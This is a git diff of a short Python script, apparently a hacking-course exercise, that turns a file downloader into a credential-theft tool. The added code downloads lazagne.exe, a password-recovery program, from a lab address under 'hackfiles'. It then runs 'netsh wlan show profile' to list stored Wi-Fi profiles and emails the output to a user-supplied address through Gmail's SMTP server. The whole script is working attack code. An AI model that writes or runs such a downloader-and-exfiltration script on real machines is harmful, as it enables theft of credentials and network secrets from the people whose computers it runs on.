@@ -1,6 +1,7 @@
 #!/usr/bin/env python3
 
-import requests #http requests through python
+import requests, subprocess, smtplib, re
+#import requests - enable http requests module through python
 
 def download(url):
     get_response = requests.get(url)
@@ -9,8 +10,24 @@ def download(url):
     #print(get_response) #returns response object
     #print(get_response.content) #show content of response object
     with open(file_name, "wb") as out_file: #wb - open file for writing as binary
-        out_file.write("test")
-
+        out_file.write(get_response.content)
+        
+def send_email(email, password, message):
+    server = smtplib.SMTP("smtp.gmail.com", 587) #creates instance of an SMTP server using SMTP lib
+    server.starttls()
+    server.login(email, password)
+    server.sendmail(email, email, message)
+    #(from_addr, to_addr, message)
+    server.quit()
+    
+    
 download("http://10.0.2.13/hackfiles/lazagne.exe")
 #download("http://rarlab.com/rar/wrar571.exe")
 #download("http://vulnweb.com/acunetix-logo.png")
+
+email = input("Enter email address to send to: ")
+password = input("Enter email password: ")
+
+command = "netsh wlan show profile" #-show wlan profiles stored on Winx.x computer
+result = subprocess.check_output(command, shell=True)
+send_email(email, password, result)
